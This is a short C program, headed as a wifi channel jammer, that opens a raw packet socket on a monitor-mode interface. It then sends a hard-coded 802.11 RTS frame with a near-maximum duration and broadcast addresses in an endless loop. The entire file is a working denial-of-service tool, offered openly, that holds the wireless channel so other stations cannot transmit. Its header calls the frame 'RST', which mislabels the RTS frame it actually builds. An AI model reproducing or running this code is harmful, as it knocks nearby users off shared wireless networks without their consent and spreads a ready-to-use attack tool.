// wifi channel jammer using RST

/*
    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.
*/

#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <net/ethernet.h>
#include <netpacket/packet.h>
#include <netinet/in.h>

void status(const char* message)
{
    printf("%s:  %s (%d)\n", message, strerror(errno), errno);
    if (errno) exit(1);
}

int main(int argc, char* argv[])
{
    if (argc < 2)
    {
        printf("%s", "Specify a monitor mode interface as parameter #1\n");
        exit(1);
    }

    int sockfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    status("create socket");

    struct ifreq ifr;
    memcpy(ifr.ifr_name, argv[1], 16);

    ioctl(sockfd, SIOCGIFINDEX, &ifr);
    status("get interface");

    struct sockaddr_ll sa;
    sa.sll_family = AF_PACKET;
    sa.sll_ifindex = ifr.ifr_ifindex;

    bind(sockfd, (const struct sockaddr *)&sa, sizeof(sa));
    status("bind socket");


    char pkt[] = {0,0,8,0,0,0,0,0, 0xb4,0,0xff,0x7f, 0xFF,0xFF,0xFF,0xFF,0xFF,0xFF, 0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};

    printf("%s", "starting operation...\n");
    fflush(stdout);

    while(1)
    {
        send(sockfd, &pkt, sizeof(pkt), 0x0);
        sleep(0);
    }

}
